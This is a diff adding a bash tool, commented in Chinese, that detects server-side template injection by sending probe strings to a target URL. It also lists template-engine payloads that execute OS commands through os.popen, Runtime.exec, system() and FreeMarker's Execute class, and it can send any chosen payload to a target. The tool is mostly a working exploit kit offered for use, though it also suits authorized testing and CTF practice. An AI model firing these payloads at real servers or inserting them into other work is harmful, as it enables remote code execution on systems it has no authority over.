@@ -1,0 +1,174 @@
+#!/usr/bin/env bash
+# ssti -- 服务端模板注入(SSTI)检测与 payload 字典（零依赖：bash + python3）
+# 用法:
+#   ssti detect "http://x/?name={INJ}" [--data "name={INJ}"] [--cookie ...]
+#   ssti payloads [引擎名]    列出各模板引擎 payload 字典(可用 trav/grep 直接套用)
+#   ssti probe "http://x/?name={INJ}" "payload"   单条 payload 发送查看响应
+
+set -u
+
+usage() {
+    cat <<'EOF'
+ssti -- 模板注入检测 + payload 字典
+
+用法:
+  ssti detect <URL> [--data "a={INJ}"] [--cookie c] [--true-word w]
+       检测: 注入 {{7*7}} 等探测串, 响应出现 49 即命中
+  ssti payloads [jinja2|twig|freemarker|velocity|smarty|tornado|erb|全部]
+       列出 payload 字典
+  ssti probe <URL> "<payload>" [--data ...] [--cookie ...]
+       发送单条 payload 看响应
+
+例子:
+  ssti detect "http://x/?name={INJ}"
+  ssti detect "http://x/" --data "username={INJ}" --true-word admin
+  ssti payloads jinja2
+EOF
+    exit 1
+}
+
+DETECT_PROBES=(
+    '{{7*7}}'
+    '${7*7}'
+    '{7*7}'
+    '<%= 7*7 %>'
+    '{{7*"7"}}'
+    '${7*7}'
+    '#{7*7}'
+    '*{7*7}'
+    '{{config}}'
+)
+
+declare -A ENGINES
+ENGINES[jinja2]='
+# Jinja2 (Flask) -- 探测 {{7*7}} 得 49
+{{7*7}}
+{{config}}
+{{self.__init__.__globals__["__builtins__"].__import__("os").popen("id").read()}}
+{{"".__class__.__mro__[1].__subclasses__()}}
+{{cycler.__init__.__globals__.os.popen("id").read()}}
+{{lipsum.__globals__["os"].popen("id").read()}}
+{{range.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}'
+
+ENGINES[twig]='
+# Twig (PHP Symfony) -- 探测 {{7*7}} 得 49
+{{7*7}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{app.request.server.all|join(",")}}'
+
+ENGINES[freemarker]='
+# FreeMarker (Java) -- 探测 ${7*7} 得 49
+${7*7}
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
+
+ENGINES[velocity]='
+# Velocity (Java) -- 探测 #set($x=7*7)$x 得 49
+#set($x=7*7)$x
+#set($e="");$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")'
+
+ENGINES[smarty]='
+# Smarty (PHP) -- 探测 {7*7} 得 49
+{7*7}
+{php}echo `id`;{/php}
+{system("id")}'
+
+ENGINES[tornado]='
+# Tornado (Python) -- 探测 {{7*7}} 得 49
+{{7*7}}
+{% import os %}{{os.popen("id").read()}}
+{{__import__("os").popen("id").read()}}'
+
+ENGINES[erb]='
+# ERB (Ruby) -- 探测 <%= 7*7 %> 得 49
+<%= 7*7 %>
+<%= system("id") %>'
+
+[ $# -lt 1 ] && usage
+
+CMD="$1"; shift
+
+case "$CMD" in
+    payloads)
+        ENG="${1:-全部}"
+        if [ "$ENG" = "全部" ]; then
+            for k in jinja2 twig freemarker velocity smarty tornado erb; do
+                echo "==== $k ===="
+                echo "${ENGINES[$k]}"
+            done
+        else
+            [ -n "${ENGINES[$ENG]:-}" ] || { echo "未知引擎: $ENG" >&2; exit 1; }
+            echo "${ENGINES[$ENG]}"
+        fi
+        ;;
+    probe)
+        URL="$1"; PAYLOAD="${2:-}"
+        [ -n "$PAYLOAD" ] || usage
+        shift 2
+        DATA="" COOKIE=""
+        while [ $# -gt 0 ]; do
+            case "$1" in
+                --data) DATA="$2"; shift 2 ;;
+                --cookie) COOKIE="$2"; shift 2 ;;
+                *) shift ;;
+            esac
+        done
+        P_ENCODED=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$PAYLOAD")
+        if [ -n "$DATA" ]; then
+            D=$(echo "$DATA" | sed "s|{INJ}|$P_ENCODED|g")
+            curl -s --max-time 8 ${COOKIE:+-H "Cookie: $COOKIE"} -d "$D" "$URL"
+        else
+            URL2=$(echo "$URL" | sed "s|{INJ}|$P_ENCODED|g")
+            curl -s --max-time 8 ${COOKIE:+-H "Cookie: $COOKIE"} "$URL2"
+        fi
+        echo
+        ;;
+    detect)
+        URL="$1"; shift
+        DATA="" COOKIE="" TRUE_WORD=""
+        while [ $# -gt 0 ]; do
+            case "$1" in
+                --data) DATA="$2"; shift 2 ;;
+                --cookie) COOKIE="$2"; shift 2 ;;
+                --true-word) TRUE_WORD="$2"; shift 2 ;;
+                *) shift ;;
+            esac
+        done
+        echo "[*] SSTI 检测: $URL"
+        HIT=0
+        for p in "${DETECT_PROBES[@]}"; do
+            P_ENCODED=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$p")
+            if [ -n "$DATA" ]; then
+                D=$(echo "$DATA" | sed "s|{INJ}|$P_ENCODED|g")
+                BODY=$(curl -s --max-time 8 ${COOKIE:+-H "Cookie: $COOKIE"} -d "$D" "$URL")
+            else
+                URL2=$(echo "$URL" | sed "s|{INJ}|$P_ENCODED|g")
+                BODY=$(curl -s --max-time 8 ${COOKIE:+-H "Cookie: $COOKIE"} "$URL2")
+            fi
+            OK=0
+            case "$p" in
+                *7*7*) [[ "$BODY" == *49* ]] && OK=1 ;;
+                *config*) [[ "$BODY" == *"__"* || "$BODY" == *secret* ]] && OK=1 ;;
+            esac
+            [ -n "$TRUE_WORD" ] && [[ "$BODY" == *"$TRUE_WORD"* ]] && OK=1
+            if [ "$OK" = 1 ]; then
+                echo "[+] HIT: $p -> 响应含 49"
+                HIT=1
+                break
+            else
+                echo "[-] $p"
+            fi
+        done
+        [ "$HIT" = 1 ] && {
+            echo "[*] 疑似模板:"
+            echo '  {{7*7}} 命中 -> Jinja2/Twig/Tornado'
+            echo '  ${7*7} 命中 -> FreeMarker/EL'
+            echo '  {7*7}  命中 -> Smarty'
+            echo '  <%= %> 命中 -> ERB/ASP'
+            echo "  用 'ssti payloads <引擎>' 拿利用链"
+        }
+        exit $(( HIT ? 0 : 1 ))
+        ;;
+    *) usage ;;
+esac
